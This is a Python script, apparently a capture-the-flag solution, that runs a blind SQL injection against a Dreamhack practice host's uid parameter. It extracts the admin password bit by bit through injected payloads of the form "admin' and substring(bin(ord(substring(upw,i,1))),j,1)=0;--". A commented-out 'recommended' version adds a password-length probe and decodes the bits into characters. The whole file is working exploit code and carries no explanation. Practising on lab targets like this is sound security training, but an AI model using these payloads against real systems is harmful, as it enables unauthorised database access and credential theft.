import urllib.request
import requests
import time

url = "http://host3.dreamhack.games:24511/"
pw = ""

pw_length = 27
print("password_size : {}\n".format(pw_length))

bit_length = 0

for i in range(1, pw_length + 1):
    bit_length = 0
    while True:
        bit_length += 1
        query = "admin' and length(bin(ord(substring(upw,{},1))))={};--".format(
            i, bit_length
        )
        r = requests.get("{}?uid={}".format(url, query))
        if "exists" in r.text:
            break

    print("index->{}\tbit_size : {}".format(i, bit_length))

    for j in range(1, bit_length + 1):
        query = "admin' and substring(bin(ord(substring(upw,{},1))),{},1)=0;--".format(
            i, j
        )
        r = requests.get("{}?uid={}".format(url, query))
        if "exists" in r.text:
            pw += "0"
        else:
            pw += "1"

        print("password is {}".format(pw))

    pw += " "

# 추천 코드
# from requests import get
# host = "http://localhost:5000"
# password_length = 0
# while True:
#     password_length += 1
#     query = f"admin' and char_length(upw) = {password_length}-- -"
#     r = get(f"{host}/?uid={query}")
#     if "exists" in r.text:
#         break
# print(f"password length: {password_length}")
# password = ""
# for i in range(1, password_length + 1):
#     bit_length = 0
#     while True:
#         bit_length += 1
#         query = f"admin' and length(bin(ord(substr(upw, {i}, 1)))) = {bit_length}-- -"
#         r = get(f"{host}/?uid={query}")
#         if "exists" in r.text:
#             break
#     print(f"character {i}'s bit length: {bit_length}")

#     bits = ""
#     for j in range(1, bit_length + 1):
#         query = f"admin' and substr(bin(ord(substr(upw, {i}, 1))), {j}, 1) = '1'-- -"
#         r = get(f"{host}/?uid={query}")
#         if "exists" in r.text:
#             bits += "1"
#         else:
#             bits += "0"
#     print(f"character {i}'s bits: {bits}")
#     password += int.to_bytes(int(bits, 2), (bit_length + 7) // 8, "big").decode("utf-8")
# print(password)
